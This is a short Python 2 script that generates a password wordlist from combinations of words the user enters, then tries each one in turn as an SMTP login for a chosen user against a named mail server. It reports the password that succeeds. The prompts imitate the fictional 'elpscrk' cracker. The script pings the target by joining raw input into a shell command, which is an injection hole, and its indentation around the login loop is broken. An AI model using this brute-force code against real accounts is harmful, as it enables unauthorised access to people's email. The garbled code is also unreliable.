import subprocess
import os
import sys
import smtplib
import argparse
import time

hostname = raw_input("Enter target: ")
response = os.system("ping " + hostname)
#Testing connection

pwlist = raw_input("Enter pwlist file name: ")
subprocess.call('cls', shell=True)
#Clears screen
time.sleep(0.8)

s = raw_input("elpsrk -list pswList.list-add ")
from itertools import product
l = s.split()
r='\n'.join(''.join(k*v for k,v in zip(l, x))
           for x in product(range(2), repeat=len(l))
           if sum(x) > 1)

save = open(pwlist, "w")
save.write(r)
save.close()
#Created wordlist with given words

user = raw_input("elpscrk -ip 216.58.209.5 -psw pswList.list -usr ")
#Select target user

numWords = 0
 
with open(pwlist, 'r') as file:
   for line in file:
		wordaList = line.split()
		numWords += len(wordaList)
 
smtpserver = smtplib.SMTP("smtp.mail.com.tr", 25)
smtpserver.ehlo()
smtpserver.starttls()
 
pwlist = open(pwlist,"r")
i=0
start_time = time.time()
for password in pwlist:
    i=i+1
    try:
        smtpserver.login(user, password)
		

	print "Password: %s" % password
	print "Scanning Complete."
	print 'Time elapsed: ' + str(time.time() - start_time)
        break;
    except smtplib.SMTPAuthenticationError:
        print "Scanning word " , str(i) , " of " , (numWords) , "\r",
print "                                \r",

